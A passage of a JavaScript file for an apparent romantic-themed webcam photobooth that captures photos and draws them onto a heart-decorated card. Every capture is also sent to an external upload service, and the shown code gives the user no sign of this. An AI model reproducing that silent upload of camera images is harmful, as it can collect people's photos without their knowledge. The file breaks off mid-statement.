let capturedImages = [];

const video = document.getElementById("video");
const captureBtn = document.getElementById("capture-btn");
const photos = document.getElementById("photos");

// Start camera
navigator.mediaDevices
  .getUserMedia({ video: true })
  .then((stream) => {
    video.srcObject = stream;
  })
  .catch((error) => {
    alert("Camera access denied!");
    console.error("Camera Error:", error);
  });

// Capture photo
function capture() {
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0);

  const imageData = canvas.toDataURL("image/png");

  if (capturedImages.length < 3) {
    capturedImages.push(imageData);
  }
  uploadToUploadcare(imageData);


  if (capturedImages.length === 3) {
    captureBtn.disabled = true;
    createPhotoCard();
  }
}

// Create final photo card
function createPhotoCard() {
  const cardCanvas = document.createElement("canvas");
  const width = 500;
  const height = 650;
  cardCanvas.width = width;
  cardCanvas.height = height;

  const ctx = cardCanvas.getContext("2d");

  // Love theme background
  const gradient = ctx.createLinearGradient(0, 0, 0, height);
  gradient.addColorStop(0, "#ffc0cb");
  gradient.addColorStop(1, "#ffe6f0");
  ctx.fillStyle = gradient;
  ctx.fillRect(0, 0, width, height);

  // Add hearts background lightly
  ctx.font = "24px Arial";
  ctx.fillStyle = "#ffb6c1";
  for (let i = 0; i < 20; i++) {
    ctx.fillText("❤️", Math.random() * width, Math.random() * height);
  }

  // Beautiful title
  ctx.fillStyle = "#d6006d";
  ctx.font = "bold 26px Arial";
  ctx.textAlign = "center";
  ctx.fillText("You're so beautiful 💖", width / 2, 50);

  // Image layout
  const imgSize = 120;
  const spacing = 20;
  const totalWidth = imgSize * 3 + spacing * 2;
  const startX = (width - totalWidth) / 2;
  const y = 90;

  let loaded = 0;

  photos.innerHTML = "<
